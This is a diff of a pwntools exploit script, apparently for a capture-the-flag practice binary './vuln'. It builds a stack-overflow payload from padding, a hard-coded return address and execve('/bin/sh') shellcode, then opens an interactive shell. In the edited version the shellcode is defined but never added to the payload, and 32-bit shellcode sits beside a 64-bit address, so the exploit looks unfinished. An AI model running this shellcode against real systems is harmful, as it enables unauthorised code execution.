@@ -1,19 +1,24 @@
 from pwn import *
 
-proc = process('./vuln') # local process (as oppposed to connecting to remote)
+# run local process (vuln program)
+proc = process('./vuln') 
 
+gdb.attach(proc, '''
+echo "hi"
+# break main
+continue
+''')
 proc.recvline() 
 
-padding = cyclic(cyclic_find('taaa'))
+padding = cyclic(264)
+eip= p64(0x7fffffffdbd0)
+shellcode = b"jhh\x2f\x2f\x2fsh\x2fbin\x89\xe3jph\x01\x01\x01\x01\x814\x24ri\x01,1\xc9Qj\x07Y\x01\xe1Qj\x08Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80"
+payload = padding+eip
 
-eip = p32(0xffffd4d0+200)
+proc.sendline(payload)
+proc.interactive()
 
-nop_slide = "\x90"*1000 
 
-shellcode = "jhh\x2f\x2f\x2fsh\x2fbin\x89\xe3jph\x01\x01\x01\x01\x814\x24ri\x01,1\xc9Qj\x07Y\x01\xe1Qj\x08Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80" # generated w shellcraft
+#we write to 0x7fffffffdbd0
 
-payload = padding + eip + nop_slide + shellcode
 
-proc.send(payload)
-
-proc.interactive() # allow us to interact w the shell
